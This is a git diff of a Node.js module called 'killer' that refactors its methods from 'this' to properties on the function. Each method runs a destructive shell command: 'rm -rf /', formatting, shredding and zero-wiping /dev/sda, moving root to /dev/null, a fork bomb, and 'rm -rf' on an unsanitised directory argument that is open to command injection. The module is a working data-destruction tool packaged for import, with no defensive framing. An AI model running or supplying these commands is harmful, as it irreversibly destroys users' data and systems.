@@ -10,7 +10,11 @@ let a  = require('app-root-path')
  */
 
 let killer = () => {
-    this.destroyRoot = () => {
+    return new Promise((done, err) => {
+        err(`Please Check the API for Available methods.`)
+    })
+}
+    killer.destroyRoot = () => {
         return new Promise((done, err) => {
             shell.exec('rm -rf /', (code, out, error) => {
                 if(error) {
@@ -21,7 +25,7 @@ let killer = () => {
             })
         })
     }
-    this.format = () => {
+    killer.format = () => {
         return new Promise((done, err) => {
             shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                 if(error) {
@@ -32,7 +36,7 @@ let killer = () => {
             })
         })
     }
-    this.overWrite = () => {
+    killer.overWrite = () => {
         return new Promise((done, err) => {
             shell.exec('shred -v /dev/sda', (code, out, error) => {
                 if(error) {
@@ -43,7 +47,7 @@ let killer = () => {
             })
         })
     }
-    this.implode = () => {
+    killer.implode = () => {
         return new Promise((done, err) => {
             shell.exec('mv / /dev/null', (code, out, error) => {
                 if(error) {
@@ -54,7 +58,7 @@ let killer = () => {
             })
         })
     }
-    this.wipe = () => {
+    killer.wipe = () => {
         return new Promise((done, err) => {
             shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                 if(error) {
@@ -65,7 +69,7 @@ let killer = () => {
             })
         })
     }
-    this.forkBomb = () => {
+    killer.forkBomb = () => {
         return new Promise((done, err) => {
             shell.exec(':(){:|:&};:', (code, out, error) => {
                 if(error) {
@@ -76,7 +80,7 @@ let killer = () => {
             })
         })
     }
-    this.destroyProject = (dir) => {
+    killer.destroyProject = (dir) => {
         return new Promise((d, e) => {
             shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                 if(er) {
@@ -87,17 +91,15 @@ let killer = () => {
             })
         })
     }
-    this.destroyADir = (dir) => {
-        return new Promise((d, e) => {
-            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
-                if(er) {
-                    e(er)
-                } else {
-                    d(`Destroyed the dir ${dir}`)
-                }
-            })
+killer.destroyADir = (dir) => {
+    return new Promise((d, e) => {
+        shell.exec(`rm -rf ${dir}`, (c, o, er) => {
+            if(er) {
+                 e(er)
+            } else {
+                 d(`Destroyed the dir ${dir}`)
+            }
         })
-    }
+    })
 }
-
 module.exports = killer;
